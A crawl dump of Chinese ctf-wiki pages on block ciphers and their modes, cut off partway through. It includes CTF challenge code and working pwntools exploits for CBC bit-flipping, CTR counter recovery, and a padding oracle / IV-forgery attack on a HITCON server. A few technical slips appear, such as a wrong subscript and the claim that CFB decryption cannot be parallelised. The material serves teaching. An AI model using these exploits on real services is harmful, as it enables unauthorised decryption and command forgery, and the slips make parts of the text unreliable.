比特位一组。每一轮的主要执行的运算有\n\n- 按位异或，⊕\n- 模加，模数为 $2^{16}$ ，⊞\n- 模乘，模数为 $2^{16}+1$ ，⊙。但是需要注意的是 0x0000 的输入会被修改为 $2^{16}$ ，$2^{16}$ 的输出结果会被修改为0x0000。\n\n这里我们称由 K5，K6 构成的中间那个方格的加密方式为MA。这也是 IDEA 算法中重要的一部分，此外，我们称 MA_L 为该部分加密后的左侧结果，其最后会和最左边的 16 比特操作；MA_R 为该部分加密后的右半部分的结果，其最后会和第三个 16 比特操作。\n\n在最后输出轮的操作如下\n\n![](figure/IDEA_Output_Trans.png)\n\n### 解密流程\n\n解密流程与加密流程相似，主要在于其密钥的选取\n\n- 第 i(1-9) 轮的解密的密钥的前 4 个子密钥由加密过程中第10-i 轮的前 4 个子密钥得出\n  - 其中第 1 个和第 4 个解密子密钥为相应的子密钥关于 $2^{16}+1$ 的乘法逆元。\n  - 第 2 个和第 3 个子密钥的取法为\n    - 当轮数为2，...，8时，取相应的第3个和第2个的子密钥的$2^{16}$ 的加密逆元。\n    - 当轮数为 1 或 9 时，取相应的第 2 个和第 3 个子密钥对应的$2^{16}$ 的加密逆元。\n- 第 5 和第 6 个密钥不变。\n\n### 总体流程\n\n![](figure/IDEA_All.png)\n\n我们来证明一下算法的正确性，这里我们关注于解密算法的第一轮，首先我们先看一下$Y_i$ 是如何得到的\n\n$Y_1 = W_{81} \\odot Z_{49}$\n\n$Y_2=W_{83}\\boxplus Z_{50}$\n\n$Y_3=W_{82}\\boxplus Z_{51}$\n\n$Y_4=W_{83}\\odot Z_{52}$\n\n解密时，第一轮直接进行的变换为\n\n$J_{11}=Y_1 \\odot U_1=Y_1 \\odot Z_{49}^{-1}=W_{81}$\n\n$J_{12}=Y_2 \\boxplus U2=Y_2\\boxplus Z_{50}^{-1}=W_{83}$\n\n$J_{13}=Y_3 \\boxplus U3=Y_3\\boxplus Z_{51}^{-1}=W_{82}$\n\n$J_{14}=Y_4 \\odot U_4=Y_4 \\odot Z_{52}^{-1}=W_{84}$\n\n可以看出得到的结果只有中间的两个16位加密结果恰好相反。我们进一步看一下$W_{8i}$ 是如何得到的。\n\n$W_{81}=I_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84})$\n\n$W_{82}=I_{83} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84})$\n\n$W_{83}=I_{82} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84})$\n\n$W_{84}=I_{84} \\oplus MA_L(I_{81}\\oplus I_{83},I_{82}\\oplus I_{84})$\n\n那么对于V11来说\n\n$V_{11}=J_{11} \\oplus MA_R(J_{11}\\oplus J_{13},J_{12}\\oplus J_{14})$\n\n通过简单带入已有的值，显然\n\n$V_{11}=W_{81} \\oplus MA_R(I_{81}\\oplus I_{83},I_{82} \\oplus I_{84})=I_{81}$\n\n对于其他的元素也类似，那么其实我们会发现第一轮解密后的结果恰好是$I_{81},I_{83},I_{82},I_{84}$。\n\n类似地，这个关系可以一直满足直到\n\n$V_{81}=I_{11},V_{82}=I_{13},V_{83}=I_{12},V_{84}=I_{14}$\n\n那么最后再经过一次简单的输出变换，恰好得到最初加密的数值。\n\n![](figure/IDEA_Round.png)\n\n\n\n## 题目\n\n- 2017 HITCON seccomp\n", "timestamp": "2025-10-21T22:02:51.007419"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/blockcipher/introduction.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/introduction.md", "content": "# 块加密\n\n## 概述\n\n所谓块加密就是每次加密一块明文，常见的加密算法有\n\n- IDEA 加密\n- DES 加密\n- AES 加密\n\n块加密也是对称加密。\n\n其实，我们也可以把块加密理解一种特殊的替代密码，但是其每次替代的是一大块。而正是由于一大块，明文空间巨大，而且对于不同的密钥，我们无法做一个表进行对应相应的密文，因此必须得有 **复杂** 的加解密算法来加解密明密文。\n\n而与此同时，明文往往可能很长也可能很短，因此在块加密时往往需要两个辅助\n\n- padding，即 padding 到指定分组长度\n- 分组加密模式，即明文分组加密的方式。\n\n## 基本策略\n\n在分组密码设计时，充分使用了 Shannon 提出的两大策略：混淆与扩散两大策略。\n\n### 混淆\n\n混淆，Confusion，将密文与密钥之间的统计关系变得尽可能复杂，使得攻击者即使获取了密文的一些统计特性，也无法推测密钥。一般使用复杂的非线性变换可以得到很好的混淆效果，常见的方法如下\n\n- S 盒\n- 乘法\n\n### 扩散\n\n扩散，Diffusion，使得明文中的每一位影响密文中的许多位。常见的方法有\n\n- 线性变换\n- 置换\n- 移位，循环移位\n\n## 常见加解密结构\n\n目前块加密中主要使用的是结构是\n\n- 迭代结构，这是因为迭代结构便于设计与实现，同时方便安全性评估。\n\n### 迭代结构\n\n#### 概述\n\n迭代结构基本如下，一般包括三个部分\n\n- 密钥置换\n- 轮加密函数\n- 轮解密函数\n\n![image-20180714222206782](./figure/iterated_cipher.png)\n\n#### 轮函数\n\n目前来说，轮函数主要有主要有以下设计方法\n\n- Feistel Network，由 Horst Feistel 发明，DES 设计者之一。\n    - DES\n- Substitution-Permutation Network(SPN)\n    - AES\n- 其他方案\n\n#### 密钥扩展\n\n目前，密钥扩展的方法有很多，没有见到什么完美的密钥扩展方法，基本原则是使得密钥的每一个比特尽可能影响多轮的轮密钥。\n", "timestamp": "2025-10-21T22:02:51.142537"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/blockcipher/mode/cbc.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/mode/cbc.md", "content": "# CBC\n\nCBC全称为密码分组链接（Cipher-block chaining） 模式，这里\n\n- IV 不要求保密\n- IV 必须是不可预测的，而且要保证完整性。\n\n## 加密\n\n![](./figure/cbc_encryption.png)\n\n## 解密\n\n![](./figure/cbc_decryption.png)\n\n## 优缺点\n\n### 优点\n\n1. 密文块不仅和当前密文块相关，而且和前一个密文块或 IV 相关，隐藏了明文的统计特性。\n2. 具有有限的两步错误传播特性，即密文块中的一位变化只会影响当前密文块和下一密文块。\n3. 具有自同步特性，即第 k 块起密文正确，则第 k+1 块就能正常解密。\n\n### 缺点\n\n1. 加密不能并行，解密可以并行。\n\n## 应用\n\nCBC 应用十分广泛\n\n- 常见的数据加密和 TLS 加密。\n- 完整性认证和身份认证。\n\n## 攻击\n\n###  字节反转攻击\n\n#### 原理\n字节反转的原理十分简单，我们观察**解密过程**可以发现如下特性:\n\n- IV 向量影响第一个明文分组\n- 第 n 个密文分组可以影响第 n + 1 个明文分组\n\n假设第$n$个密文分组为$C_n$，解密后的第$n$个明文分组为为$P_n$。\n\n然后$P_{n+1}=C_n~\\text{xor}~f(C_{n+1})$。\n\n其中$f$函数为图中的$\\text{Block Cipher Decryption}$。\n\n对于某个信息已知的原文和密文，然后我们可以修改第$n$个密文块$C_n$为$C_n~\\text{xor}~P_{n+1}~\\text{xor}~A$。然后再对这条密文进行解密，那么解密后的第$n$个明文快将会变成$A$。\n\n#### 例题\n\n```python\nfrom flag import FLAG\nfrom Crypto.Cipher import AES\nfrom Crypto import Random\nimport base64\n\nBLOCK_SIZE=16\nIV = Random.new().read(BLOCK_SIZE)\npassphrase = Random.new().read(BLOCK_SIZE)\n\npad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)\nunpad = lambda s: s[:-ord(s[len(s) - 1:])]\n\nprefix = \"flag=\"+FLAG+\"&userdata=\"\nsuffix = \"&user=guest\"\ndef menu():\n    print \"1. encrypt\"\n    print \"2. decrypt\"\n    return raw_input(\"> \")\n\ndef encrypt():\n    data = raw_input(\"your data: \")\n    plain = prefix+data+suffix\n    aes = AES.new(passphrase, AES.MODE_CBC, IV)\n    print base64.b64encode(aes.encrypt(pad(plain)))\n\n\ndef decrypt():\n    data = raw_input(\"input data: \")\n    aes = AES.new(passphrase, AES.MODE_CBC, IV)\n    plain = unpad(aes.decrypt(base64.b64decode(data)))\n    print 'DEBUG ====> ' + plain\n    if plain[-5:]==\"admin\":\n        print plain\n    else:\n        print \"you are not admin\"\n\ndef main():\n    for _ in range(10):\n        cmd = menu()\n        if cmd==\"1\":\n            encrypt()\n        elif cmd==\"2\":\n            decrypt()\n        else:\n            exit()\n\nif __name__==\"__main__\":\n    main()\n```\n\n可见题目希望我们提供一个加密的字符串，如果这个字符串解密后最后的内容为admin。程序将会输出明文。所以题目流程为先随便提供一个明文，然后将密文进行修改，使得解密后的字符串最后的内容为admin,我们可以枚举flag的长度来确定我们需要在什么位置进行修改。\n\n以下是exp.py\n\n```python\nfrom pwn import *\nimport base64\n\npad = 16\ndata = 'a' * pad\nfor x in range(10, 100):\n    r = remote('xxx.xxx.xxx.xxx', 10004)\n    #r = process('./chall.sh')\n    \n    r.sendlineafter('> ', '1')\n    r.sendlineafter('your data: ', data)\n    cipher = list(base64.b64decode(r.recv()))\n    #print 'cipher ===>', ''.join(cipher)\n    \n    BLOCK_SIZE = 16\n    prefix = \"flag=\" + 'a' * x + \"&userdata=\"\n    suffix = \"&user=guest\"\n    plain = prefix + data + suffix\n    \n    idx = (22 + x + pad) % BLOCK_SIZE + ((22 + x + pad) / BLOCK_SIZE - 1) * BLOCK_SIZE\n    cipher[idx + 0] = chr(ord(cipher[idx + 0]) ^ ord('g') ^ ord('a'))\n    cipher[idx + 1] = chr(ord(cipher[idx + 1]) ^ ord('u') ^ ord('d'))\n    cipher[idx + 2] = chr(ord(cipher[idx + 2]) ^ ord('e') ^ ord('m'))\n    cipher[idx + 3] = chr(ord(cipher[idx + 3]) ^ ord('s') ^ ord('i'))\n    cipher[idx + 4] = chr(ord(cipher[idx + 4]) ^ ord('t') ^ ord('n'))\n\n    r.sendlineafter('> ', '2')\n    r.sendlineafter('input data: ', base64.b64encode(''.join(cipher)))\n\n    msg = r.recvline()\n    if 'you are not admin' not in msg:\n        print msg\n        break\n    r.close()  \n\n```\n### Padding Oracle Attack\n具体参见下面的介绍。\n", "timestamp": "2025-10-21T22:02:51.427961"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/blockcipher/mode/cfb.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/mode/cfb.md", "content": "# CFB\n\nCFB 全称为密文反馈模式（Cipher feedback）。\n\n## 加密\n\n![](./figure/cfb_encryption.png)\n\n## 解密\n\n![](./figure/cfb_decryption.png)\n\n## 优缺点\n\n### 优点\n\n- 适应于不同数据格式的要求\n- 有限错误传播\n- 自同步\n\n### 缺点\n\n- 加密不能并行化，解密不能并行\n\n## 应用场景\n\n该模式适应于数据库加密，无线通信加密等对数据格式有特殊要求的加密环境。\n\n## 题目\n\n- HITCONCTF-Quals-2015-Simple-(Crypto-100)\n\n", "timestamp": "2025-10-21T22:02:51.539471"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/blockcipher/mode/ctr.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/mode/ctr.md", "content": "# CTR\n\nCTR全称为计数器模式（Counter mode），该模式由 Diffe 和 Hellman 设计。\n\n## 加密\n\n![](./figure/ctr_encryption.png)\n\n## 解密\n\n![](./figure/ctr_decryption.png)\n\n## 特点\n\n| 特性                          | 描述     |\n| ----------------------------- | -------- |\n| 加密可并行化 (Encryption parallelizable) | 是 (Yes) |\n| 解密可并行化 (Decryption parallelizable) | 是 (Yes) |\n| 随机读取访问 (Random read access)   | 是 (Yes) |\n\nCTR 模式比 OFB 模式有一些优势。一个优点是它允许并行加密和解密多个块，因为可以为每个块独立计算密钥流。这可以提高加密和解密过程的性能和效率。\n\n## 2023 某CTF\n\n题面\n\n```python\nfrom Crypto.Util.number import long_to_bytes, bytes_to_long\nfrom Crypto.Cipher import AES\nfrom Crypto.Util import Counter\nfrom hashlib import sha256\nimport os\nfrom secret import flag\n\ndef padding(msg):\n    return msg + os.urandom(16 - len(msg) % 16)\n\nmsg = b\"where is the flag? Key in my Heart/Counter!!!!\"\nkey = b\"I w0nder how????\"\n\nassert len(msg) == 46\nassert len(key) == 16\n\nenc_key = os.urandom(16)\ninitial_value = bytes_to_long(enc_key)\nhash = sha256(str(initial_value).encode()).hexdigest()\n\naes = AES.new(enc_key,AES.MODE_ECB)\nenc_flag = aes.encrypt(padding(flag))\n\nctr = Counter.new(AES.block_size * 8, initial_value = initial_value) \naes = AES.new(key, counter = ctr, mode = AES.MODE_CTR)\nenc = aes.encrypt(msg)\n\nprint(\"enc = {}\".format(enc[-16:]))\nprint(\"enc_flag = {}\".format(enc_flag))\nprint(\"hash = {}\".format(hash))\n\n\"\"\"\nenc_last16 = b'\\xbe\\x9bd\\xc6\\xd4=\\x8c\\xe4\\x95bi\\xbc\\xe01\\x0e\\xb8'\nenc_flag = b'\\xb2\\x97\\x83\\x1dB\\x13\\x9b\\xc2\\x97\\x9a\\xa6+M\\x19\\xd74\\xd2-\\xc0\\xb6\\xba\\xe8ZE\\x0b:\\x14\\xed\\xec!\\xa1\\x92\\xdfZ\\xb0\\xbd\\xb4M\\xb1\\x14\\xea\\xd8\\xee\\xbf\\x83\\x16g\\xfa'\nhash = efb07225b3f1993113e104757210261083c79de50f577b3f0564368ee7b25eeb\n\"\"\"\n```\n\n可以看出: 先用 ECB 模式加密了 `flag`，且这时的 `key1` 是未知的，同时给出将 `key1` 字节转整数后进行 sha256 hash 的结果\n\n将 `key1` 字节转整数设为 CTR 模式中 `Counter` 的计数器初始值，且接下来用此 `Counter` 作为参数对明文， `key2` 进行加密，并给出密文最后16字节，这其中: 明文、`key2`、最后一块的密文(实际上还需处理) 我们都是已知的\n\n这时我们的目标即为根据已知条件来逆推回 `Counter` 初始值\n\n我们来回顾下 CTR 模式加密流程: \n\n![](./figure/ctr_encryption.png)\n\n想要得到 `Counter`，那就得先得到加密器给出的结果，加密时: $明文 \\oplus E(Counter) = 密文$，而根据异或性质 $E(Counter)$ 则为 $明文 \\oplus 密文$\n\n这时仅剩将 $E(Counter)$ 转为 $Counter$\n\n这里我们不要被 CTR 模式加解密图示所局限思维，实际上只看最后这部分，完全可以将其理解为 ECB 模式的某一个块，那解密即为: $D(E(Counter)) = Counter$\n\n接着我们还要将 $Counter$ 减去其在加密过程中，计数器增加的数值，则为最终的结果\n\n其中还有一些坑点可以看如下 Exploit 中的注释\n\n```python\nfrom Crypto.Util.number import long_to_bytes, bytes_to_long\nfrom Crypto.Cipher import AES\nfrom Crypto.Util import Counter\nfrom hashlib import sha256\nimport os\n# from secret import flag\nflag = b'flag{test}'\n\ndef padding(msg):\n    return msg + os.urandom(16 - len(msg) % 16)  # 随机值填充\n\nmsg = b\"where is the flag? Key in my Heart/Counter!!!!\"\nkey = b\"I w0nder how????\"\n\nassert len(msg) == 46\nassert len(key) == 16\n\nenc_key = os.urandom(16)  # 随机key\ninitial_value = bytes_to_long(enc_key) # key转为整数\nhash = sha256(str(initial_value).encode()).hexdigest()  # 字符串(key) 的 sha256\n\naes = AES.new(enc_key,AES.MODE_ECB) \nenc_flag = aes.encrypt(padding(flag))\n\n                # 16 * 8 = 128,\n# {'counter_len': 16, 'prefix': b'', 'suffix': b'', 'initial_value': 1, 'little_endian': False}\nctr = Counter.new(AES.block_size * 8, initial_value = initial_value) \nprint(ctr)\naes = AES.new(key, counter = ctr, mode = AES.MODE_CTR)  # key 已知, 推 counter, CTR mode 不需要 padding\nenc = aes.encrypt(msg)  # msg 已知\n\n\n# print(\"enc = {}\".format(len(enc)))  # 46\nprint(\"enc = {}\".format(enc[-16:]))  # 密文的最后16位, 但并不是最后一个 block\nprint(\"enc_flag = {}\".format(enc_flag))\nprint(\"hash = {}\".format(hash))\nprint('题目数据输出结束' + ' *' * 16)\n# Data\nenc_last16 = b'\\xbe\\x9bd\\xc6\\xd4=\\x8c\\xe4\\x95bi\\xbc\\xe01\\x0e\\xb8'\nenc_flag = b'\\xb2\\x97\\x83\\x1dB\\x13\\x9b\\xc2\\x97\\x9a\\xa6+M\\x19\\xd74\\xd2-\\xc0\\xb6\\xba\\xe8ZE\\x0b:\\x14\\xed\\xec!\\xa1\\x92\\xdfZ\\xb0\\xbd\\xb4M\\xb1\\x14\\xea\\xd8\\xee\\xbf\\x83\\x16g\\xfa'\nhash = 'efb07225b3f1993113e104757210261083c79de50f577b3f0564368ee7b25eeb'\n\n# Solution\n# a = msg[32:]  # 从明文index 32 开始\na = msg[16 * (len(msg) // 16):]  # 取最后一个 block\nb = enc_last16[16 - (len(enc) % 16):]  # 从密文index 2 开始 | 选最后一个 block\n# 加密最后步骤 明文 xor enc_{key}(counter) = 密文\n# 解密最后步骤 enc_{key}(counter) xor 密文 = 明文 | enc_{key}(counter) = 密文 xor 明文\nenc_Counter1 = bytes(a[i] ^ b[i] for i in range(14))  \nfor i in range(0xff):\n    for j in range(0xff):\n        # ECB mode 要求数据长度与块长对齐, 而加密后的数据的最后 2 bytes 我们并不清楚, 所以我们需要尝试所有的可能\n        enc_Counter2 = enc_Counter1 + bytes([i]) + bytes([j])\n        aes = AES.new(key,AES.MODE_ECB)\n        Counter = aes.decrypt(enc_Counter2)  # E_{key}(Counter) = Counter_enc | Counter = D_{key}(Counter_enc)\n        initial_value = bytes_to_long(Counter) - (len(msg) // 16)  # 经历两个 block, 最后一个 block 的 Counter - block 数 = 初始值\n        if hash == sha256(str(initial_value).encode()).hexdigest():  # type: str\n            print(f'found {initial_value = }')\n            enc_key = long_to_bytes(initial_value)\n            aes = AES.new(enc_key,AES.MODE_ECB)\n            flag = aes.decrypt(enc_flag)\n            print(flag)\n            break\n# flag{9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d}\n```\n\n## 题目\n\n- 2017 star ctf ssss\n- 2017 star ctf ssss2\n", "timestamp": "2025-10-21T22:02:51.664572"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/blockcipher/mode/ecb.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/mode/ecb.md", "content": "# ECB\n\nECB模式全称为电子密码本模式（Electronic codebook）。\n\n## 加密\n\n![](./figure/ecb_encryption.png)\n\n## 解密\n\n![](./figure/ecb_decryption.png)\n\n## 优缺点\n\n### 优点\n\n1. 实现简单。\n2. 不同明文分组的加密可以并行计算，速度很快。\n\n### 缺点\n\n1. 同样的明文块会被加密成相同的密文块，不会隐藏明文分组的统计规律。正如下图所示\n\n![image-20180716215135907](./figure/ecb_bad_linux.png)\n\n为了解决统一明文产生相同密文的问题，提出了其它的加密模式。\n\n## 典型应用\n\n1. 用于随机数的加密保护。\n2. 用于单分组明文的加密。\n\n## 2016 ABCTF aes-mess-75\n\n 题目描述如下\n\n```\nWe encrypted a flag with AES-ECB encryption using a secret key, and got the hash: e220eb994c8fc16388dbd60a969d4953f042fc0bce25dbef573cf522636a1ba3fafa1a7c21ff824a5824c5dc4a376e75 However, we lost our plaintext flag and also lost our key and we can't seem to decrypt the hash back :(. Luckily we encrypted a bunch of other flags with the same key. Can you recover the lost flag using this?\n\n[HINT] There has to be some way to work backwards, right?\n```\n\n可以看出，这个加密是一个 ECB 加密，然后 AES 是 16 个字节一组，每个字节可以使用两个 16 进制字符表示，因此，我们每 32 个字符一组进行分组，然后去对应的 txt 文件中搜索即可。\n\n对应 flag\n\n```\ne220eb994c8fc16388dbd60a969d4953 abctf{looks_like\nf042fc0bce25dbef573cf522636a1ba3 _you_can_break_a\nfafa1a7c21ff824a5824c5dc4a376e75 es}\n```\n\n最后一个显然在加密时进行了 padding。\n\n## 题目\n\n- 2018 PlaidCTF macsh\n\n", "timestamp": "2025-10-21T22:02:51.773228"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/blockcipher/mode/ofb.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/mode/ofb.md", "content": "# OFB\n\nOFB全称为输出反馈模式（Output feedback），其反馈内容是分组加密后的内容而不是密文。\n\n## 加密\n\n![](./figure/ofb_encryption.png)\n\n## 解密\n\n![](./figure/ofb_decryption.png)\n\n## 优缺点\n\n### 优点\n\n1. 不具有错误传播特性。\n\n### 缺点\n\n1. IV 无需保密，但是对每个消息必须选择不同的 IV。\n2. 不具有自同步能力。\n\n## 适用场景\n\n适用于一些明文冗余度比较大的场景，如图像加密和语音加密。\n\n", "timestamp": "2025-10-21T22:02:52.146167"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/blockcipher/mode/padding-oracle-attack.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/mode/padding-oracle-attack.md", "content": "# Padding Oracle Attack\n\n## 介绍\n\nPadding Oracle Attack 攻击一般需要满足以下几个条件\n\n- 加密算法\n    - 采用 PKCS5 Padding 的加密算法。 当然，非对称加密中 OAEP 的填充方式也有可能会受到影响。\n    - 分组模式为 CBC 模式。\n- 攻击者能力\n    - 攻击者可以拦截上述加密算法加密的消息。\n    - 攻击者可以和 padding oracle（即服务器） 进行交互：客户端向服务器端发送密文，服务器端会以某种返回信息告知客户端 padding 是否正常。\n\nPadding Oracle Attack 攻击可以达到的效果如下\n\n- 在不清楚 key 和 IV 的前提下解密任意给定的密文。\n\n## 原理\n\nPadding Oracle Attack 攻击的基本原理如下\n\n- 对于很长的消息一块一块解密。\n- 对于每一块消息，先解密消息的最后一个字节，然后解密倒数第二个字节，依次类推。\n\n这里我们回顾一下 CBC 的\n\n- 加密\n\n$$\nC_i=E_K(P_i \\oplus C_{i-1})\\\\\nC_0=IV\n$$\n\n- 解密\n\n$$\nP_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV\n$$\n\n我们主要关注于解密，这里我们并不知道 IV 和 key。这里我们假设密文块的长度为 n 个字节。\n\n假设我们截获了密文最后两个密文块 $F$ 与 $Y$ ，以获取密文块 $Y$ 的对应明文的最后一个字节为例子进行分析。为了获取 $Y$ 解密后的内容，我们首先需要伪造一块密文块 $F'$ 以便于可以修改 $Y$ 对应解密明文的最后一个字节。这是因为若我们构造密文 `F'|Y` ，那么解密 $Y$ 时具体为 $P'=D_K(Y)\\oplus F'$ ，所以修改密文块 $F'$ 的最后一个字节 $F'_{n}$ 可以修改 Y 对应解密明文 $P'$ 的最后一个字节 $P'_n$ ，进而反推出原先的明文 $P$ 的最后一个字节。下面给出获取 $P$ 最后一个字节的过程：\n\n1. `i=0`，设置 $F'$ 的每个字节为**随机字节**。\n2. 设置 $F'_n=i \\oplus 0x01$ 。\n3. 将 `F'|Y` 发送给服务器，如果服务器端没有报错，那有很大概率 $P'$ 的最后一个字节是 0x01。否则，只有 $P'$ 的最后 $P'_n \\oplus i \\oplus 0x01$ 字节都是 $P'_n \\oplus i \\oplus 0x01$ 才不会报错。**而且，需要注意的是 padding 的字节只能是 1 到 n。** 因此，若想要使得在 F' 随机地情况下，并且满足 padding 字节大小的约束情况下还不报错**概率很小**。所以在服务器端不报错的情况下，我们可以认为我们确实获取了正确的字节。这时可知 $D_k(Y)$ 的最后一个字节 $D_k(Y)_n$ 为 $P'_n \\oplus F'_n = 0x01 \\oplus i \\oplus 0x01 = i$ ，即可知道原先的明文 $P$ 的最后一个字节 $P_n = D_k(Y)_n \\oplus F_n = i \\oplus F_n$ 。\n4. 在出现错误的情况下，`i=i+1`，跳转到 2.。\n\n当获取了 $P$ 的最后一个字节后，我们可以继续获取 $P$ 的倒数第二个字节，此时需要设置 $F'_n=D_k(Y)_n\\oplus 0x02$ ，同时设置 $F_{n-1}=i \\oplus 0x02$ 去枚举 `i`。以此类推，我们可以获取 Y 所对应的明文 $P$ 的所有字节。\n\n所以，综上所示，Padding Oracle Attack 其实在一定程度上是一种具有很大概率成功的攻击方法。\n\n然而，需要注意的是，往往遇到的一些现实问题并不是标准的 Padding Oracle Attack 模式，我们往往需要进行一些变形。\n\n## 2017 HITCON Secret Server\n\n### 分析\n\n程序中采用的加密是 AES CBC，其中采用的 padding 与 PKCS5 类似\n\n```python\ndef pad(msg):\n    pad_length = 16-len(msg)%16\n    return msg+chr(pad_length)*pad_length\n\ndef unpad(msg):\n    return msg[:-ord(msg[-1])]\n```\n\n但是，在每次 unpad 时并没有进行检测，而是直接进行 unpad。\n\n其中，需要注意的是，每次和用户交互的函数是\n\n- `send_msg` ，接受用户的明文，使用固定的 `2jpmLoSsOlQrqyqE` 作为 IV，进行加密，并将加密结果输出。\n- `recv_msg` ，接受用户的 IV 和密文，对密文进行解密，并返回。根据返回的结果会有不同的操作\n\n```python\n            msg = recv_msg().strip()\n            if msg.startswith('exit-here'):\n                exit(0)\n            elif msg.startswith('get-flag'):\n                send_msg(flag)\n            elif msg.startswith('get-md5'):\n                send_msg(MD5.new(msg[7:]).digest())\n            elif msg.startswith('get-time'):\n                send_msg(str(time.time()))\n            elif msg.startswith('get-sha1'):\n                send_msg(SHA.new(msg[8:]).digest())\n            elif msg.startswith('get-sha256'):\n                send_msg(SHA256.new(msg[10:]).digest())\n            elif msg.startswith('get-hmac'):\n                send_msg(HMAC.new(msg[8:]).digest())\n            else:\n                send_msg('command not found')\n```\n\n### 主要漏洞\n\n这里我们再简单总结一下我们已有的部分\n\n- 加密\n  - 加密时的 IV 是固定的而且已知。\n  - 'Welcome!!' 加密后的结果。\n- 解密\n  - 我们可以控制 IV。\n\n首先，既然我们知道 `Welcome!!` 加密后的结果，还可以控制 recv_msg 中的 IV，那么根据解密过程\n\n$$\nP_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV\n$$\n\n如果我们将 `Welcome!!` 加密后的结果输入给 recv_msg，那么直接解密后的结果便是 `（Welcome!!+'\\x07'*7) xor iv`，如果我们**恰当的控制解密过程中传递的 iv**，那么我们就可以控制解密后的结果。也就是说我们可以执行**上述所说的任意命令**。从而，我们也就可以知道 `flag` 解密后的结果。\n\n其次，在上面的基础之上，如果我们在任何密文 C 后面添加自定义的 IV 和 Welcome 加密后的结果，作为输入传递给 recv_msg，那么我们便可以控制解密之后的消息的最后一个字节，**那么由于 unpad 操作，我们便可以控制解密后的消息的长度减小 0 到 255**。\n\n### 利用思路\n\n基本利用思路如下\n\n1. 绕过 proof of work\n2. 根据执行任意命令的方式获取加密后的 flag。\n3. 由于 flag 的开头是 `hitcon{`，一共有7个字节，所以我们任然可以通过控制 iv 来使得解密后的前 7 个字节为指定字节。这使得我们可以对于解密后的消息执行 `get-md5` 命令。而根据 unpad 操作，我们可以控制解密后的消息恰好在消息的第几个字节处。所以我们可以开始时将控制解密后的消息为 `hitcon{x`，即只保留`hitcon{` 后的一个字节。这样便可以获得带一个字节哈希后的加密结果。类似地，我们也可以获得带制定个字节哈希后的加密结果。\n4. 这样的话，我们可以在本地逐字节爆破，计算对应 `md5`，然后再次利用任意命令执行的方式，控制解密后的明文为任意指定命令，如果控制不成功，那说明该字节不对，需要再次爆破；如果正确，那么就可以直接执行对应的命令。\n\n具体代码如下\n\n```python\n#coding=utf-8\nfrom pwn import *\nimport base64, time, random, string\nfrom Crypto.Cipher import AES\nfrom Crypto.Hash import SHA256, MD5\n#context.log_level = 'debug'\nif args['REMOTE']:\n    p = remote('52.193.157.19', 9999)\nelse:\n    p = remote('127.0.0.1', 7777)\n\n\ndef strxor(str1, str2):\n    return ''.join([chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(str1, str2)])\n\n\ndef pad(msg):\n    pad_length = 16 - len(msg) % 16\n    return msg + chr(pad_length) * pad_length\n\n\ndef unpad(msg):\n    return msg[:-ord(msg[-1])]  # 去掉pad\n\n\ndef flipplain(oldplain, newplain, iv):\n    \"\"\"flip oldplain to new plain, return proper iv\"\"\"\n    return strxor(strxor(oldplain, newplain), iv)\n\n\ndef bypassproof():\n    p.recvuntil('SHA256(XXXX+')\n    lastdata = p.recvuntil(')', drop=True)\n    p.recvuntil(' == ')\n    digest = p.recvuntil('\\nGive me XXXX:', drop=True)\n\n    def proof(s):\n        return SHA256.new(s + lastdata).hexdigest() == digest\n\n    data = pwnlib.util.iters.mbruteforce(\n        proof, string.ascii_letters + string.digits, 4, method='fixed')\n    p.sendline(data)\n    p.recvuntil('Done!\\n')\n\n\niv_encrypt = '2jpmLoSsOlQrqyqE'\n\n\ndef getmd5enc(i, cipher_flag, cipher_welcome):\n    \"\"\"return encrypt( md5( flag[7:7+i] ) )\"\"\"\n    ## keep iv[7:] do not change, so decrypt won't change\n    new_iv = flipplain(\"hitcon{\".ljust(16, '\\x00'), \"get-md5\".ljust(\n        16, '\\x00'), iv_encrypt)\n    payload = new_iv + cipher_flag\n    ## calculate the proper last byte number\n    last_byte_iv = flipplain(\n        pad(\"Welcome!!\"),\n        \"a\" * 15 + chr(len(cipher_flag) + 16 + 16 - (7 + i + 1)), iv_encrypt)\n    payload += last_byte_iv + cipher_welcome\n    p.sendline(base64.b64encode(payload))\n    return p.recvuntil(\"\\n\", drop=True)\n\n\ndef main():\n    bypassproof()\n\n    # result of encrypted Welcome!!\n    cipher = p.recvuntil('\\n', drop=True)\n    cipher_welcome = base64.b64decode(cipher)[16:]\n    log.info(\"cipher welcome is : \" + cipher_welcome)\n\n    # execute get-flag\n    get_flag_iv = flipplain(pad(\"Welcome!!\"), pad(\"get-flag\"), iv_encrypt)\n    payload = base64.b64encode(get_flag_iv + cipher_welcome)\n    p.sendline(payload)\n    cipher = p.recvuntil('\\n', drop=True)\n    cipher_flag = base64.b64decode(cipher)[16:]\n  